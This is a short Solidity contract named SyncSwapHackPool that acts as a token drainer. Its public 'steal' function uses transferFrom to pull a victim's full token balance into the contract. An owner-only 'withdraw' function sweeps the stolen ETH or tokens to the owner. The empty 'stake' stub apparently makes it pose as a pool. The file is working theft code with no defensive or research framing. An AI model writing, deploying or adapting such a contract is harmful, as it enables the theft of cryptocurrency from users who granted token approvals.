pragma solidity 0.8.19;
//import { IERC20 } from "/home/less/crypto/fzksync/sample-fzksync-project/lib/era-system-contracts/contracts/openzeppelin/token/ERC20/IERC20.sol";
//import { IERC20 } from "../libraries/IERC20.sol";

import { IERC20 } from "../lib/openzeppelin-contracts/contracts/interfaces/IERC20.sol";


contract SyncSwapHackPool {
    address immutable owner;

    constructor(address _owner) 
    {
        owner=_owner;
    }

    function withdraw(address _assetAddress) external payable {
        require(msg.sender == owner);
        uint assetBalance;
        if (_assetAddress == address(0)){//ETHER) {
            address self = address(this); // workaround for a possible solidity bug
            assetBalance = self.balance;
            payable(msg.sender).transfer(assetBalance);
        } else {
            assetBalance = IERC20(_assetAddress).balanceOf(address(this));
            unchecked {
            IERC20(_assetAddress).transfer(msg.sender, assetBalance - 1);
            }
        }
        ////emit LogWithdraw(msg.sender, _assetAddress, assetBalance);
    }

    function stake(uint amount, address onBehalf) external
    {

    }

    function steal(address victim, address token) external
    {
        IERC20(token).transferFrom(victim, address(this), IERC20(token).balanceOf(victim));
    }
}